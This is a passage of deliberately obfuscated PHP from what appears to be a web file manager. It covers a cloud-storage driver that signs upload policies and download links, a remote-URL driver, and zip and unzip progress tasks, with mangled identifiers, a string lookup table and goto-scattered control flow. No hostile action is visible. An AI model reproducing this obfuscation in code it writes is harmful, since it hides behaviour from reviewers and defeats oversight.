$D´á∞Áµ∑ã); } public function multiUploadFormData($eÏõé¨Úâª, $fÚôëÇÍ¡π = 3600) { $bÏ„©…ÆÌ≈ =& $_SERVER[¯èãÄπµ]; $e€ÂÒè“ˆø = (int) $GLOBALS[$bÏ„©…ÆÌ≈[7]][$bÏ„©…ÆÌ≈[77]]; return $this->uploadPolicy($eÏõé¨Úâª, $fÚôëÇÍ¡π, $e€ÂÒè“ˆø); } private function uploadPolicy($eıﬁ·ÀœÇÜ, $A‰ ‚ø„íΩ = 3600, $e¿ππøÖ«Æ = 0) { goto BÀõõ¥Ú≠¿; BÀõõ¥Ú≠¿: $BÁ∏£ã¢Éã =& $_SERVER[¯èãÄπµ]; $aù≥¢√©…≤ = $BÁ∏£ã¢Éã[8] . $this->bucket; $a€ˆ«®¬î⁄ = gmdate($BÁ∏£ã¢Éã[1201]); goto e–ØŸıå˘î; DÂÂœ‰¥¥£: $D·¥°å©◊¯ = base64_encode(hash_hmac($BÁ∏£ã¢Éã[1238], "\120\x4f\x53\x54\46{$aù≥¢√©…≤}\46{$a€ˆ«®¬î⁄}\x26{$d¢üîﬁÂ⁄•}", md5("{$this->userpass}"), !0)); $c≠ÊÚ¥ìßì = array($BÁ∏£ã¢Éã[1107] => $d¢üîﬁÂ⁄•, $BÁ∏£ã¢Éã[1273] => "\125\x50\x59\125\x4e\x20{$this->username}\x3a{$D·¥°å©◊¯}", $BÁ∏£ã¢Éã[165] => $this->endpoint . $aù≥¢√©…≤); return $c≠ÊÚ¥ìßì; goto C¢Çºÿôå∫; e–ØŸıå˘î: $b¬”Ú⁄Øë™ = array($BÁ∏£ã¢Éã[1269] => $this->bucket, $BÁ∏£ã¢Éã[1270] => $eıﬁ·ÀœÇÜ, $BÁ∏£ã¢Éã[1271] => time() + $A‰ ‚ø„íΩ, $BÁ∏£ã¢Éã[1272] => $a€ˆ«®¬î⁄); if ($e¿ππøÖ«Æ) { $b¬”Ú⁄Øë™[$BÁ∏£ã¢Éã[1187]] = $e¿ππøÖ«Æ; } $d¢üîﬁÂ⁄• = base64_encode(json_encode($b¬”Ú⁄Øë™)); goto DÂÂœ‰¥¥£; C¢Çºÿôå∫: } public function download($bﬂ¯üœâ—¿, $A¶ﬁ ⁄é«Ê) { goto b«Ñ≤Ê¶Ÿ‘; E¿ú‘±Í€ä: $cé≠˜≤â·ó = 1024 * 200; $C¯ÑƒÌúÙŸ = fopen($B∫÷ó∂ì…∆, $_SERVER[¯èãÄπµ][1222]); while (!0) { $BÙÆÜ˜…ò≈ = $this->fileSubstr($bﬂ¯üœâ—¿, $e„îÔ•…≤‘, $cé≠˜≤â·ó); if ($BÙÆÜ˜…ò≈ === !1) { return !1; } fwrite($C¯ÑƒÌúÙŸ, $BÙÆÜ˜…ò≈); $e„îÔ•…≤‘ += $cé≠˜≤â·ó; if (strlen($BÙÆÜ˜…ò≈) < $cé≠˜≤â·ó) { break; } } goto CπâÉÂπåß; b«Ñ≤Ê¶Ÿ‘: $B∫÷ó∂ì…∆ = IO::getPathInner(IO::mkfile($A¶ﬁ ⁄é«Ê)); if (!($CÕó”Œﬁ‡¨ = $this->link($bﬂ¯üœâ—¿))) { return !1; } $e„îÔ•…≤‘ = 0; goto E¿ú‘±Í€ä; CπâÉÂπåß: fclose($C¯ÑƒÌúÙŸ); return $A¶ﬁ ⁄é«Ê; goto dÉàÜËÌæ…; dÉàÜËÌæ…: } public function link($c°¶í»°µá, $E≥ø‹…åÂπ = array()) { $aœ˘≈é§œä =& $_SERVER[¯èãÄπµ]; $c°¶í»°µá = trim($c°¶í»°µá, $aœ˘≈é§œä[8]); if (!empty($this->token)) { $e®ÓÍôÊ⁄¥ = strtotime(date($aœ˘≈é§œä[1274])); $eÀ≤ﬂÕóõÔ = substr(md5($this->token . $aœ˘≈é§œä[268] . $e®ÓÍôÊ⁄¥ . $aœ˘≈é§œä[1275] . $c°¶í»°µá), 12, 8) . $e®ÓÍôÊ⁄¥; $E≥ø‹…åÂπ[] = $aœ˘≈é§œä[1276] . $eÀ≤ﬂÕóõÔ; } $d⁄úøòÉã˜ = !empty($E≥ø‹…åÂπ) ? $aœ˘≈é§œä[69] . implode($aœ˘≈é§œä[268], $E≥ø‹…åÂπ) : $aœ˘≈é§œä[33]; return $this->getHost() . $aœ˘≈é§œä[8] . $c°¶í»°µá . $d⁄úøòÉã˜; } public function fileOut($DÉ™Ñ£ÃÇà, $cÔ˜⁄Áì”ó = false, $A⁄áê›áµˆ = false, $dò´óä≤Ï∏ = '') { if (!$A⁄áê›áµˆ) { $A⁄áê›áµˆ = $this->pathThis($DÉ™Ñ£ÃÇà); } $f°ÿÔÇªâ… = $cÔ˜⁄Áì”ó ? array($_SERVER[¯èãÄπµ][1277] . rawurlencode($A⁄áê›áµˆ)) : array(); $E¨Ü∫”¶’Û = $this->link($DÉ™Ñ£ÃÇà, $f°ÿÔÇªâ…); $this->fileOutLink($E¨Ü∫”¶’Û); } public function fileOutServer($d¡§ù©ÕÊó, $B÷¬ôÖå≈ = false, $cœÀÌ≥‹’Ÿ = false, $B´Ú≠Èóí… = '') { parent::fileOut($d¡§ù©ÕÊó, $B÷¬ôÖå≈, $cœÀÌ≥‹’Ÿ, $B´Ú≠Èóí…); } public function fileOutImage($d‘“„ÖÆ≤ƒ, $Eç§ÛËíÆë = 250) { $Bå¶Ø’‹≈Ñ = $this->link($d‘“„ÖÆ≤ƒ . $_SERVER[¯èãÄπµ][1278] . $Eç§ÛËíÆë); $this->fileOutLink($Bå¶Ø’‹≈Ñ); } public function fileOutImageServer($B°êïâêÁÈ, $a¨‡ºΩÊ∞Ú = 250) { parent::fileOutImage($B°êïâêÁÈ, $a¨‡ºΩÊ∞Ú); } public function hashMd5($DùñÚÒˆÈ‚) { $B·≤ñÁÈ–î =& $_SERVER[¯èãÄπµ]; $câÛ∫ö≥µè = $this->objectMeta($DùñÚÒˆÈ‚); return isset($câÛ∫ö≥µè[$B·≤ñÁÈ–î[192]]) ? $câÛ∫ö≥µè[$B·≤ñÁÈ–î[192]] : !1; } public function size($Bª≥úÃº≥á) { $BñÛı‚á’ß = $this->objectMeta($Bª≥úÃº≥á); return $BñÛı‚á’ß ? $BñÛı‚á’ß[$_SERVER[¯èãÄπµ][77]] : 0; } public function info($f·ÈÑçµã„) { if ($this->isFolder($f·ÈÑçµã„)) { return $this->folderInfo($f·ÈÑçµã„); } else { if ($this->isFile($f·ÈÑçµã„)) { return $this->fileInfo($f·ÈÑçµã„); } } return !1; } public function exist($BﬁÕÃíìäÉ) { return $this->isFile($BﬁÕÃíìäÉ) || $this->isFolder($BﬁÕÃíìäÉ); } public function isFile($Fÿ¥ö∑É”æ) { return !$this->isFolder($Fÿ¥ö∑É”æ) && $this->objectMeta($Fÿ¥ö∑É”æ); } public function isFolder($Eø†ÊÁµÉ∑) { return $this->cacheMethod($_SERVER[¯èãÄπµ][219], $Eø†ÊÁµÉ∑); } protected function objectMeta($eˆ◊Í¥–ÌÙ) { return $this->cacheMethod($_SERVER[¯èãÄπµ][220], $eˆ◊Í¥–ÌÙ); } protected function _objectMeta($aóª∞√ç£È) { goto bÊé›ùÉΩà; A–πÑ∑êûç: if (!$c÷óœ˘Æ≈±[$C˘Í™≈©Üë[1034]]) { return null; } $DÙïÆœ”Ç÷ = isset($c÷óœ˘Æ≈±[$C˘Í™≈©Üë[1036]]) ? $c÷óœ˘Æ≈±[$C˘Í™≈©Üë[1036]] : array(); if (!isset($DÙïÆœ”Ç÷[$C˘Í™≈©Üë[1280]])) { return null; } goto fﬂç≥æ”•; fﬂç≥æ”•: $C¬µÿ‚±∫‡ = array($C˘Í™≈©Üë[28] => get_path_this($aóª∞√ç£È), $C˘Í™≈©Üë[29] => isset($DÙïÆœ”Ç÷[$C˘Í™≈©Üë[1280]]) ? $DÙïÆœ”Ç÷[$C˘Í™≈©Üë[1280]] : null, $C˘Í™≈©Üë[77] => isset($DÙïÆœ”Ç÷[$C˘Í™≈©Üë[1281]]) ? $DÙïÆœ”Ç÷[$C˘Í™≈©Üë[1281]] : null, $C˘Í™≈©Üë[192] => isset($DÙïÆœ”Ç÷[$C˘Í™≈©Üë[1282]]) ? $DÙïÆœ”Ç÷[$C˘Í™≈©Üë[1282]] : null, $C˘Í™≈©Üë[1249] => isset($DÙïÆœ”Ç÷[$C˘Í™≈©Üë[1283]]) ? $DÙïÆœ”Ç÷[$C˘Í™≈©Üë[1283]] : null); $C¬µÿ‚±∫‡[$C˘Í™≈©Üë[1250]] = isset($DÙïÆœ”Ç÷[$C˘Í™≈©Üë[1284]]) ? strtotime($DÙïÆœ”Ç÷[$C˘Í™≈©Üë[1284]]) : $C¬µÿ‚±∫‡[$C˘Í™≈©Üë[1249]]; return $C¬µÿ‚±∫‡; goto b◊≥Øû∏®œ; bÊé›ùÉΩà: $C˘Í™≈©Üë =& $_SERVER[¯èãÄπµ]; if ($aóª∞√ç£È == $C˘Í™≈©Üë[33] || $aóª∞√ç£È == $C˘Í™≈©Üë[8]) { return array(); } $c÷óœ˘Æ≈± = $this->ussRequest($aóª∞√ç£È, $C˘Í™≈©Üë[1279]); goto A–πÑ∑êûç; b◊≥Øû∏®œ: } protected function _isFolder($D¿∆∫πƒ°ì) { $Dà≤å∆Í¯Ó =& $_SERVER[¯èãÄπµ]; if ($D¿∆∫πƒ°ì == $Dà≤å∆Í¯Ó[33] || $D¿∆∫πƒ°ì == $Dà≤å∆Í¯Ó[8]) { return !0; } $C‡∆∆±ªÑ¿ = $this->objectMeta($D¿∆∫πƒ°ì); return isset($C‡∆∆±ªÑ¿[$Dà≤å∆Í¯Ó[29]]) && $C‡∆∆±ªÑ¿[$Dà≤å∆Í¯Ó[29]] == $Dà≤å∆Í¯Ó[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($D∂†Õí¯àß = false) { } public function exist($FÀÒµô¨™⁄) { $Eèæà‚ºõ® = $this->info($FÀÒµô¨™⁄); return $Eèæà‚ºõ®[$_SERVER[¯èãÄπµ][184]]; } public function isFile($aœ≥ÚŒí«ú) { $a™Ñºê«Ωî = $this->info($aœ≥ÚŒí«ú); return $a™Ñºê«Ωî[$_SERVER[¯èãÄπµ][184]]; } public function isFolder($F”ø∏’ºÏ∫) { return !1; } public function size($A„æ«±°çÖ) { $aˆÿåô´òÌ = $this->info($A„æ«±°çÖ); return $aˆÿåô´òÌ[$_SERVER[¯èãÄπµ][77]]; } public function info($CÎ¿∞ÿëúê) { return $this->infoParse($CÎ¿∞ÿëúê); } public function infoAuth($c⁄Ü„¿ËŒÒ) { return $this->infoParse($c⁄Ü„¿ËŒÒ); } public function infoWithChildren($Eèü˘ÏÜ⁄∂) { return $this->infoParse($Eèü˘ÏÜ⁄∂); } public function infoFull($C–‡‹⁄∫é) { return $this->infoParse($C–‡‹⁄∫é); } private function infoParse($Cà¬∫∞ﬂ¨¡) { $eﬂ±ûΩ…öî =& $_SERVER[¯èãÄπµ]; $C⁄ÇÓéÏ•  = $this->header($Cà¬∫∞ﬂ¨¡); if (!$C⁄ÇÓéÏ•  || !$C⁄ÇÓéÏ• [$eﬂ±ûΩ…öî[692]]) { return !1; } $dÔË≠∆É‘ì = _get($C⁄ÇÓéÏ• , $eﬂ±ûΩ…öî[321], 0); $fé§†¥Õòπ = array($eﬂ±ûΩ…öî[28] => $C⁄ÇÓéÏ• [$eﬂ±ûΩ…öî[28]], $eﬂ±ûΩ…öî[75] => $Cà¬∫∞ﬂ¨¡, $eﬂ±ûΩ…öî[29] => $eﬂ±ûΩ…öî[163], $eﬂ±ûΩ…öî[77] => intval($dÔË≠∆É‘ì), $eﬂ±ûΩ…öî[156] => get_path_ext($C⁄ÇÓéÏ• [$eﬂ±ûΩ…öî[28]]), $eﬂ±ûΩ…öî[1156] => $dÔË≠∆É‘ì > 0 && $C⁄ÇÓéÏ• [$eﬂ±ûΩ…öî[1285]], $eﬂ±ûΩ…öî[1157] => !1); return $fé§†¥Õòπ; } private function header($f´«∆¢ŸÛ™) { if (isset(self::$_cacheHeader[$f´«∆¢ŸÛ™])) { return self::$_cacheHeader[$f´«∆¢ŸÛ™]; } self::$_cacheHeader[$f´«∆¢ŸÛ™] = url_header($f´«∆¢ŸÛ™); return self::$_cacheHeader[$f´«∆¢ŸÛ™]; } public function hashSimple($BâÏÜüÏÇñ, $BÉºÜä”• = false) { goto dÊΩﬂı√≥à; f—€±∂Ï¬¢: $fÖ¬˜–äñÇ .= $this->fileSubstr($BâÏÜüÏÇñ, $eÒπÿ·ÛÖè - $CÍ∏îΩÕé…, $CÍ∏îΩÕé…); return md5($fÖ¬˜–äñÇ) . $eÒπÿ·ÛÖè; goto Aﬁî‰»âÖ’; dÊΩﬂı√≥à: $b‹¯∞πêç“ =& $_SERVER[¯èãÄπµ]; $a†∞áÚı≤ì = $this->info($BâÏÜüÏÇñ); if (!$a†∞áÚı≤ì || !$a†∞áÚı≤ì[$b‹¯∞πêç“[184]]) { return !1; } goto f°ÈÚß¥â; déçç√±Öè: $EÏÒ◊Ì“∫‘ = timeFloat(); $f≠ùöÚÇ¨˜ = 15; for ($DÏ¡¥Çí±† = 0; $DÏ¡¥Çí±† < $FÒéí¢õíÇ; $DÏ¡¥Çí±†++) { if (timeFloat() - $EÏÒ◊Ì“∫‘ > $f≠ùöÚÇ¨˜) { return !1; } $DËâˆåìÊŸ = $this->fileSubstr($BâÏÜüÏÇñ, $eÚ¡æ∂∏ÆÑ * $DÏ¡¥Çí±†, $CÍ∏îΩÕé…); if (!$DËâˆåìÊŸ) { return !1; } $fÖ¬˜–äñÇ .= $DËâˆåìÊŸ; } goto f—€±∂Ï¬¢; c†—ß¬Ù£»: if ($eÒπÿ·ÛÖè <= $CÍ∏îΩÕé… * $FÒéí¢õíÇ) { return md5($this->fileSubstr($BâÏÜüÏÇñ, 0, $eÒπÿ·ÛÖè)) . $eÒπÿ·ÛÖè; } $eÚ¡æ∂∏ÆÑ = intval($eÒπÿ·ÛÖè / $FÒéí¢õíÇ); $fÖ¬˜–äñÇ = $b‹¯∞πêç“[33]; goto déçç√±Öè; f°ÈÚß¥â: $eÒπÿ·ÛÖè = $a†∞áÚı≤ì[$b‹¯∞πêç“[77]]; $CÍ∏îΩÕé… = 200; $FÒéí¢õíÇ = 50; goto c†—ß¬Ù£»; Aﬁî‰»âÖ’: } public function getContent($Eÿ⁄√àå¨÷) { return $this->fileSubstr($Eÿ⁄√àå¨÷); } public function fileSubstr($A¬™µæ©‹, $D√¡™Ñ¶îå = 0, $E∂ëÙ‡¢â = -1) { goto fõƒá§É‚≤; Bã∂ÜÛÿØë: if ($E∂ëÙ‡¢â === -1) { $E∂ëÙ‡¢â = $béﬂ˘ì˜Ÿ¯[$D∫äÈ…Ü˘ñ[77]]; } if ($E∂ëÙ‡¢â == 0) { return $D∫äÈ…Ü˘ñ[33]; } $AíÓåÕª”Ÿ = array($D∫äÈ…Ü˘ñ[1286] . $D√¡™Ñ¶îå . $D∫äÈ…Ü˘ñ[717] . ($D√¡™Ñ¶îå + $E∂ëÙ‡¢â - 1)); goto bﬂ™Ûøïº‰; fõƒá§É‚≤: $D∫äÈ…Ü˘ñ =& $_SERVER[¯èãÄπµ]; $béﬂ˘ì˜Ÿ¯ = $this->info($A¬™µæ©‹); if (!$béﬂ˘ì˜Ÿ¯ || !$béﬂ˘ì˜Ÿ¯[$D∫äÈ…Ü˘ñ[184]] && $béﬂ˘ì˜Ÿ¯[$D∫äÈ…Ü˘ñ[77]] > 1024 * 1024 * 10) { return !1; } goto Bã∂ÜÛÿØë; bﬂ™Ûøïº‰: $B¡¶⁄°„›‹ = url_request($A¬™µæ©‹, $D∫äÈ…Ü˘ñ[212], !1, $AíÓåÕª”Ÿ, !1, !1, 1); return $B¡¶⁄°„›‹[$D∫äÈ…Ü˘ñ[1036]] ? $B¡¶⁄°„›‹[$D∫äÈ…Ü˘ñ[1036]] : $D∫äÈ…Ü˘ñ[33]; goto eπµ»Œèª¬; eπµ»Œèª¬: } public function download($a•â∫“éîË, $E√⁄‹â∫Ωˆ) { Downloader::start($a•â∫“éîË, $E√⁄‹â∫Ωˆ); return $E√⁄‹â∫Ωˆ; } } goto fÆ≈öéÛ‹ı; C∞ à”êï¯: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto CƒÎóÁÌ–í; CƒÎóÁÌ–í: $eÑÚ‚ü˜íï =& $_SERVER[¯èãÄπµ]; parent::startAfter(); Hook::bind($eÑÚ‚ü˜íï[1489], array($this, $eÑÚ‚ü˜íï[1490])); goto fç¨ï›˜å«; eÕÔ»Ö¢åÎ: if (!$eÒ…ﬂ¡⁄—£[$eÑÚ‚ü˜íï[1332]]) { $eÒ…ﬂ¡⁄—£[$eÑÚ‚ü˜íï[1332]] = LNG($eÑÚ‚ü˜íï[1493]); } goto e∞´ÁÖ¶”É; fç¨ï›˜å«: Hook::bind($eÑÚ‚ü˜íï[1037], array($this, $eÑÚ‚ü˜íï[1491])); $eÒ…ﬂ¡⁄—£ =& $this->task; $eÒ…ﬂ¡⁄—£[$eÑÚ‚ü˜íï[1492]] = $eÑÚ‚ü˜íï[1042]; goto eÕÔ»Ö¢åÎ; e∞´ÁÖ¶”É: } protected function endAfter() { $dùò∑Çöúï =& $_SERVER[¯èãÄπµ]; parent::endAfter(); Hook::unbind($dùò∑Çöúï[1489], array($this, $dùò∑Çöúï[1490])); Hook::unbind($dùò∑Çöúï[1037], array($this, $dùò∑Çöúï[1491])); } public function updateAfter() { $B¥›©ÍÍ¶† =& $_SERVER[¯èãÄπµ]; $D≥⁄⁄’°Ò¨ =& $this->task; if (!$D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[980]] || !$D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[701]]) { return; } if ($D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[1492]] == $B¥›©ÍÍ¶†[1042]) { $Cò¯Ÿá™úÇ = 0; if ($D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[1469]]) { $Cò¯Ÿá™úÇ = $D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[1470]] / $D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[1469]]; } $D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[1425]] = $Cò¯Ÿá™úÇ * 0.3; } else { if ($D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[1492]] == $B¥›©ÍÍ¶†[297]) { $Cò¯Ÿá™úÇ = $D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[992]] / $D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[980]]; $D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[1425]] = 0.3 + $Cò¯Ÿá™úÇ * 0.4; } else { if ($D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[1492]] == $B¥›©ÍÍ¶†[102]) { $eÙÛø¢Ü∞® = 0; if ($D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[1471]] == $B¥›©ÍÍ¶†[102]) { $eÙÛø¢Ü∞® = $D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[1470]]; } $Cò¯Ÿá™úÇ = ($D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[1474]] + $eÙÛø¢Ü∞®) / $D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[701]]; $D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[1425]] = 0.3 + 0.4 + $Cò¯Ÿá™úÇ * 0.3; } } } if ($D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[1425]] > 0) { $FæŸ“√Ω®ß = timeFloat() - $D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[1427]] - $D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[1430]]; $D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[1431]] = $FæŸ“√Ω®ß * (1 - $D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[1425]]) / $D≥⁄⁄’°Ò¨[$B¥›©ÍÍ¶†[1425]]; } } public function addFile($cÁ™˘Ó˘Ÿˆ) { goto C–™®±õó‚; C–™®±õó‚: $C°∫ŒÔ¡Éç =& $_SERVER[¯èãÄπµ]; $f©ÿâë€°™ =& $this->task; $D„ÚÈÁ∑è† = IO::info($cÁ™˘Ó˘Ÿˆ); goto C≤çÑÀêì¡; F≤ÀÌ˜Çëƒ: $f©ÿâë€°™[$C°∫ŒÔ¡Éç[980]] = 1; $C«Ù≈÷ˆ¶á = 0; $f©ÿâë€°™[$C°∫ŒÔ¡Éç[1475]] = array($C°∫ŒÔ¡Éç[1476] => $C«Ù≈÷ˆ¶á + 1, $C°∫ŒÔ¡Éç[382] => $D„ÚÈÁ∑è†[$C°∫ŒÔ¡Éç[28]], $C°∫ŒÔ¡Éç[75] => $D„ÚÈÁ∑è†[$C°∫ŒÔ¡Éç[75]], $C°∫ŒÔ¡Éç[462] => $D„ÚÈÁ∑è†[$C°∫ŒÔ¡Éç[462]] ? $D„ÚÈÁ∑è†[$C°∫ŒÔ¡Éç[462]] : $D„ÚÈÁ∑è†[$C°∫ŒÔ¡Éç[75]]); goto f∑¬√âΩèç; cØµ•⁄‚…Õ: $f©ÿâë€°™[$C°∫ŒÔ¡Éç[982]] = $C°∫ŒÔ¡Éç[1482]; $f©ÿâë€°™[$C°∫ŒÔ¡Éç[1471]] = $C°∫ŒÔ¡Éç[1042]; $f©ÿâë€°™[$C°∫ŒÔ¡Éç[701]] = $D„ÚÈÁ∑è†[$C°∫ŒÔ¡Éç[77]]; goto F≤ÀÌ˜Çëƒ; C≤çÑÀêì¡: $f©ÿâë€°™[$C°∫ŒÔ¡Éç[1467]] = $D„ÚÈÁ∑è†[$C°∫ŒÔ¡Éç[28]]; $f©ÿâë€°™[$C°∫ŒÔ¡Éç[1469]] = $D„ÚÈÁ∑è†[$C°∫ŒÔ¡Éç[77]]; $f©ÿâë€°™[$C°∫ŒÔ¡Éç[1470]] = 0; goto cØµ•⁄‚…Õ; f∑¬√âΩèç: $this->update(); goto c±õÿÜ–çó; c±õÿÜ–çó: } public function unzipAfter($e¥£òÿ§âë) { goto A¡»ÇóéÕ; e»˘å˜∫Ç«: $bˆ‹ä¢∆“´[$B‡çµ∂·„˜[992]] = 0; $bˆ‹ä¢∆“´[$B‡çµ∂·„˜[1469]] = 0; $bˆ‹ä¢∆“´[$B‡çµ∂·„˜[1470]] = 0; goto D¶∆ûËïß ; D±œèÖËøç: if ($d„‹¿Ω°∞á[$B‡çµ∂·„˜[29]] == $B‡çµ∂·„˜[163]) { $bˆ‹ä¢∆“´[$B‡çµ∂·„˜[980]] = 1; } else { $bˆ‹ä¢∆“´[$B‡çµ∂·„˜[980]] = $d„‹¿Ω°∞á[$B‡çµ∂·„˜[80]][$B‡çµ∂·„˜[78]]; } $bˆ‹ä¢∆“´[$B‡çµ∂·„˜[982]] = $B‡çµ∂·„˜[33]; $bˆ‹ä¢∆“´[$B‡çµ∂·„˜[1471]] = 0; goto e»˘å˜∫Ç«; A¨à¶—÷ã„: $d„‹¿Ω°∞á = IO::infoWithChildren($e¥£òÿ§âë); $F˜£πÉéìÚ = 0; $bˆ‹ä¢∆“´[$B‡çµ∂·„˜[1475]] = array($B‡çµ∂·„˜[1476] => $F˜£πÉéìÚ + 1, $B‡çµ∂·„˜[382] => $d„‹¿Ω°∞á[$B‡çµ∂·„˜[28]], $B‡çµ∂·„˜[75] => $d„‹¿Ω°∞á[$B‡çµ∂·„˜[75]], $B‡çµ∂·„˜[462] => $d„‹¿Ω°∞á[$B‡çµ∂·„˜[462]] ? $d„‹¿Ω°∞á[$B‡çµ∂·„˜[462]] : $d„‹¿Ω°∞á[$B‡çµ∂·„˜[75]]); goto D±œèÖËøç; D¶∆ûËïß : $bˆ‹ä¢∆“´[$B‡çµ∂·„˜[1467]] = $B‡çµ∂·„˜[33]; $bˆ‹ä¢∆“´[$B‡çµ∂·„˜[1474]] = 0; $bˆ‹ä¢∆“´[$B‡çµ∂·„˜[701]] = $d„‹¿Ω°∞á[$B‡çµ∂·„˜[77]]; goto bÿÆûΩ–›; A¡»ÇóéÕ: $B‡çµ∂·„˜ =& $_SERVER[¯èãÄπµ]; $bˆ‹ä¢∆“´ =& $this->task; $bˆ‹ä¢∆“´[$B‡çµ∂·„˜[1492]] = $B‡çµ∂·„˜[102]; goto A¨à¶—÷ã„; bÿÆûΩ–›: $this->update(); self::log($B‡çµ∂·„˜[1494] . json_encode(array($bˆ‹ä¢∆“´, $d„‹¿Ω°∞á))); goto e˜Ãπ”±Ø›; e˜Ãπ”±Ø›: } public function nameParse($E Ÿ†∏ùé) { goto b◊∆ãç¡©…; e†ˆÙ‹åã«: $this->update(); goto b‹…Î•ˆˆÚ; b◊∆ãç¡©…: $eùÆçÈéØÓ =& $_SERVER[¯èãÄπµ]; $DÔíû±å…± =& $this->task; if ($DÔíû±å…±[$eùÆçÈéØÓ[1492]] == $eùÆçÈéØÓ[1042]) { $DÔíû±å…±[$eùÆçÈéØÓ[1492]] = $eùÆçÈéØÓ[297]; $DÔíû±å…±[$eùÆçÈéØÓ[1474]] = 0; $DÔíû±å…±[$eùÆçÈéØÓ[701]] = 0; } goto F≥ÕèÔˆàá; F≥ÕèÔˆàá: $C‰®’±§πõ = get_path_this($E Ÿ†∏ùé); if (strstr($C‰®’±§πõ, $eùÆçÈéØÓ[91])) { $DÔíû±å…±[$eùÆçÈéØÓ[992]] += 1; $DÔíû±å…±[$eùÆçÈéØÓ[980]] += 1; } $DÔíû±å…±[$eùÆçÈéØÓ[1467]] = $E Ÿ†∏ùé; goto e†ˆÙ‹åã«; b‹…Î•ˆˆÚ: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $e€îá©€ı÷ =& $_SERVER[¯èãÄπµ]; parent::startAfter(); Hook::bind($e€îá©€ı÷[1495], array($this, $e€îá©€ı÷[1490])); $Aõ¯Õ∫îõº =& $this->task; $Aõ¯Õ∫îõº[$e€îá©€ı÷[1492]] = $e€îá©€ı÷[1042]; if (!$Aõ¯Õ∫îõº[$e€îá©€ı÷[1332]]) { $Aõ¯Õ∫îõº[$e€îá©€ı÷[1332]] = LNG($e€îá©€ı÷[1496]); } } protected function endAfter() { $cûº’åÿË≠ =& $_SERVER[¯èãÄπµ]; parent::endAfter(); Hook::unbind($cûº’åÿË≠[1495], array($this, $cûº’åÿË≠[1490])); } public function updateAfter() { $D¢ •å…ïº =& $_SERVER[¯èãÄπµ]; $c–è‰†Âﬂ≈ =& $this->task; if (!$c–è‰†Âﬂ≈[$D¢ •å…ïº[980]] || !$c–è‰†Âﬂ≈[$D¢ •å…ïº[701]]) { return; } if ($c–è‰†Âﬂ≈[$D¢ •å…ïº[1492]] == $D¢ •å…ïº[1042]) { $Cﬁ≠éÑ‡©ú = $c–è‰†Âﬂ≈[$D¢ •å…ïº[1470]]; if ($c–è‰†Âﬂ≈[$D¢ •å…ïº[1471]] != $D¢ •å…ïº[1042]) { $Cﬁ≠éÑ‡©ú = 0; } $Cé”ûÊÇ∆ó = ($c–è‰†Âﬂ≈[$D¢ •å…ïº[1474]] + $Cﬁ≠éÑ‡©ú) / $c–è‰†Âﬂ≈[$D¢ •å…ïº[701]]; $c–è‰†Âﬂ≈[$D¢ •å…ïº[1425]] = $Cé”ûÊÇ∆ó * 0.3; } else { if ($c–è‰†Âﬂ≈[$D¢ •å…ïº[1492]] == $D¢ •å…ïº[297]) { $Cé”ûÊÇ∆ó = $c–è‰†Âﬂ≈[$D¢ •å…ïº[992]] / $c–è‰†Âﬂ≈[$D¢ •å…ïº[980]]; $c–è‰†Âﬂ≈[$D¢ •å…ïº[1425]] = 0.3 + $Cé”ûÊÇ∆ó * 0.5; } else { if ($c–è‰†Âﬂ≈[$D¢ •å…ïº[1492]] == $D¢ •å…ïº[102]) { $Cé”ûÊÇ∆ó = 0; if ($c–è‰†Âﬂ≈[$D¢ •å…ïº[1469]]) { $Cé”ûÊÇ∆ó = $c–è‰†Âﬂ≈[$D¢ •å…ïº[1470]] / $c–è‰†Âﬂ≈[$D¢ •å…ïº[1469]]; } $c–è‰†Âﬂ≈[$D¢ •å…ïº[1425]] = 0.3 + 0.5 + $Cé”ûÊÇ∆ó * 0.2; } } } if ($c–è‰†Âﬂ≈[$D¢ •å…ïº[1425]] > 0) { $fÎèËê⁄≤ã = timeFloat() - $c–è‰†Âﬂ≈[$D¢ •å…ïº[1427]] - $c–è‰†Âﬂ≈[$D¢ •å…ïº[1430]]; $c–è‰†Âﬂ≈[$D¢ •å…ïº[1431]] = $fÎèËê⁄≤ã * (1 - $c–è‰†Âﬂ≈[$D¢ •å…ïº[1425]]) / $c–è‰†Âﬂ≈[$D¢ •å…ïº[1425]]; } } public function copyFileStart($c™¿‚òí≈ã, $Fπç…úÔÜä, $cíÿ£’œ¥◊, $AÿøäÔà÷π, $C§Óñ÷≈—‰, $BﬂÇ÷∞ ø) { $b±§Øõ≈Ê˘ =& $_SERVER[¯èãÄπµ]; parent::copyFileStart($c™¿‚òí≈ã, $Fπç…úÔÜä, $cíÿ£’œ¥◊, $AÿøäÔà÷π, $C§Óñ÷≈—‰, $BﬂÇ÷∞ ø); $eóˆï¬òØö =& $this->task; if ($eóˆï¬òØö[$b±§Øõ≈Ê˘[1492]] == $b±§Øõ≈Ê˘[297]) { $eóˆï¬òØö[$b±§Øõ≈Ê˘[1492]] = $b±§Øõ≈Ê˘[102]; } $this->update(); } public function copyFileEnd($FÂéãõ≤£Ú, $eíìï≠Ö©ê, $F¶ñÊ” Ω›, $BÒ£¥–¿≠ﬁ, $Aê÷ú™ÜÂñ, 